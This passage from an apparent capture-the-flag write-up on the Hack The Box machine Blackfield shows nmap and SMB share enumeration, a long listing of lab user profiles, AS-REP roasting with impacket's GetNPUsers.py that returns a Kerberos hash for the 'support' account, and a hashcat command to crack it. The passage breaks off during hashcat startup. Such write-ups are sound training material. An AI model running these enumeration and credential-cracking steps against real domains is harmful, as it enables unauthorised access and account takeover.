<span class="o">|</span><span class="n">_</span>    <span class="no">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="ow">and</span> <span class="n">required</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="ss">time: 
</span><span class="o">|</span>   <span class="ss">date: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11</span><span class="no">T19</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">44</span>
<span class="o">|</span><span class="n">_</span>  <span class="ss">start_date: </span><span class="no">N</span><span class="o">/</span><span class="no">A</span>

<span class="no">TRACEROUTE</span> <span class="p">(</span><span class="n">using</span> <span class="n">port</span> <span class="mi">53</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
<span class="no">HOP</span> <span class="no">RTT</span>       <span class="no">ADDRESS</span>
<span class="mi">1</span>   <span class="mf">185.74</span> <span class="n">ms</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.1</span>
<span class="mi">2</span>   <span class="mf">186.22</span> <span class="n">ms</span> <span class="n">blackfiled</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.192</span><span class="p">)</span>

<span class="no">OS</span> <span class="ow">and</span> <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">224.21</span> <span class="n">seconds</span>
</code></pre></div></div>

<h2 id="smb-enumeration">SMB enumeration</h2>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">root</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 

        </span><span class="no">Sharename</span>       <span class="no">Type</span>      <span class="no">Comment</span>
        <span class="o">---------</span>       <span class="o">----</span>      <span class="o">-------</span>
        <span class="no">ADMIN</span><span class="err">$</span>          <span class="no">Disk</span>      <span class="no">Remote</span> <span class="no">Admin</span>
        <span class="no">C</span><span class="err">$</span>              <span class="no">Disk</span>      <span class="no">Default</span> <span class="n">share</span>
        <span class="n">forensic</span>        <span class="no">Disk</span>      <span class="no">Forensic</span> <span class="o">/</span> <span class="no">Audit</span> <span class="n">share</span><span class="o">.</span>
        <span class="no">IPC</span><span class="err">$</span>            <span class="no">IPC</span>       <span class="no">Remote</span> <span class="no">IPC</span>
        <span class="no">NETLOGON</span>        <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
        <span class="n">profiles</span><span class="err">$</span>       <span class="no">Disk</span>      
        <span class="no">SYSVOL</span>          <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
<span class="no">SMB1</span> <span class="n">disabled</span> <span class="o">--</span> <span class="n">no</span> <span class="n">workgroup</span> <span class="n">available</span>

</code></pre></div></div>

<h2 id="having-a-look-in-profiles">Having a look in <code class="language-plaintext highlighter-rouge">profiles$</code></h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Ac3:~# smbclient //10.10.10.192/profiles<span class="err">$</span>
Enter WORKGROUP<span class="se">\r</span>oot<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANavay                              D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  APustulka                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ARotella                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASischo                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ATakach                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                7846143 blocks of size 4096. 3579546 blocks available
smb: \&gt; 
</span></code></pre></div></div>
<h2 id="making-a-username-list-from-the-profiles">making a <code class="language-plaintext highlighter-rouge">username</code> list from the <code class="language-plaintext highlighter-rouge">profiles</code></h2>

<blockquote>
  <p>Copy the usernames to a file <code class="language-plaintext highlighter-rouge">users.txt</code> and scan for <code class="language-plaintext highlighter-rouge">Kerberos tickets</code>.</p>
</blockquote>

<h2 id="getting-kerberos-ticket">Getting Kerberos ticket</h2>

<h2 id="using-impacket-getnpuserspy-to-get-the-kerberos-ticket">Using impacket <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> to get the kerberos ticket.</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">GetNPUsers</span><span class="p">.</span><span class="n">py</span>  <span class="n">blackfield</span><span class="p">.</span><span class="n">local</span><span class="o">/</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">blackfield</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">usersfile</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span>
</code></pre></div></div>

<h3 id="after-running-impacket-script-we-get-the-kerberos-ticket-of-support">After running impacket script we get the kerberos ticket of <code class="language-plaintext highlighter-rouge">support</code>.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">Kerberos</span> <span class="no">SessionError</span><span class="p">:</span> <span class="no">KDC_ERR_C_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="no">Client</span> <span class="ow">not</span> <span class="n">found</span> <span class="k">in</span> <span class="no">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">Kerberos</span> <span class="no">SessionError</span><span class="p">:</span> <span class="no">KDC_ERR_C_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="no">Client</span> <span class="ow">not</span> <span class="n">found</span> <span class="k">in</span> <span class="no">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">Kerberos</span> <span class="no">SessionError</span><span class="p">:</span> <span class="no">KDC_ERR_C_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="no">Client</span> <span class="ow">not</span> <span class="n">found</span> <span class="k">in</span> <span class="no">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="vg">$krb5asrep$23$support</span><span class="vi">@BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f788d565face046beea93</span><span class="vg">$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">User</span> <span class="n">svc_backup</span> <span class="n">doesn</span><span class="err">'</span><span class="n">t</span> <span class="n">have</span> <span class="no">UF_DONT_REQUIRE_PREAUTH</span> <span class="n">set</span>

</code></pre></div></div>

<h2 id="time-to-crack-the-hash">Time to crack the hash.</h2>

<h3 id="we-can-user-any-hash-cracker-of-our-choice-here-ive-used-hashcat-to-crack-the-hash">we can user any hash cracker of our choice, here I’ve used <code class="language-plaintext highlighter-rouge">hashcat</code> to crack the hash.</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hashcat</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">m</span> <span class="mi">18200</span> <span class="nb">hash</span><span class="p">.</span><span class="n">txt</span> <span class="n">D</span><span class="p">:</span>\<span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
<span class="nf">hashcat </span><span class="p">(</span><span class="n">v6</span><span class="p">.</span><span class="mf">0.0</span><span class="p">)</span> <span class="n">starting</span><span class="bp">...</span>

<span class="o">*</span> <span class="n">Device</span> <span class="c1">#1: Unstable OpenCL driver detected!
</span>
<span class="n">This</span> <span class="n">OpenCL</span> <span class="n">driver</span> <span class="n">has</span> <span class="n">been</span> <span class="n">marked</span> <span class="k">as</span> <span class="n">likely</span> <span class="n">to</span> <span class="n">fail</span> <span class="n">kernel</span> <span class="n">compilation</span> <span class="ow">or</span> <span class="n">to</span> <span class="n">produce</span> <span class="n">false</span> <span class="n">negatives</span><span class="p">.</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">use</span> <span class="o">--</span><span class="n">force</span> <span class="n">to</span> <span class="n">override</span> <span class="n">this</span><span class="p">,</span> <span class="n">but</span> <span class="n">do</span> <span class="ow">not</span> <span class="n">report</span> <span class="n">related</span> <span class="n">errors</span><span class="p">.</span>

<span class="o">*</span> <span class="n">Device</span> <span class="c1">#3: CUDA SDK Toolkit installation NOT detected.
</span>             <span class="n">CUDA</span> <span class="n">SDK</span> <span class="n">Toolkit</span> <span class="n">installation</span> <span class="n">required</span> <span class="k">for</span> <span class="n">proper</span> <span class="n">device</span> <span class="n">support</span> <span class="ow">and</span> <span class="n">utilization</span>
             <span class="n">Falling</span> <span class="n">back</span> <span class="n">to</span> <span class="n">OpenCL</span> <span class="n">Runtime</span>

<span class="o">*</span> <span class="n">Device</span> <span class="c1">#3: WARNING! Kernel exec timeout is not disabled.
</span>             <span class="n">This</span> <span class="n">may</span> <span class="n">cause</span> <span class="sh">"</span><span class="s">CL_OUT_OF_RESOURCES</span><span class="sh">"</span> <span class="ow">or</span> <span class="n">related</span> <span class="n">errors</span><span class="p">.</span>
             <span class="n">To</span> <span class="n">disable</span> <span class="n">the</span> <span class="n">timeout</span><span class="p">,</span> <span class="n">see</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">q</span><span class="o">/</span><span class="n">timeoutpatch</span>
<span class="nf">nvmlDeviceGetFanSpeed</span><span class="p">():</span> <span class="n">Not</span> <span class="n">Supported</span>

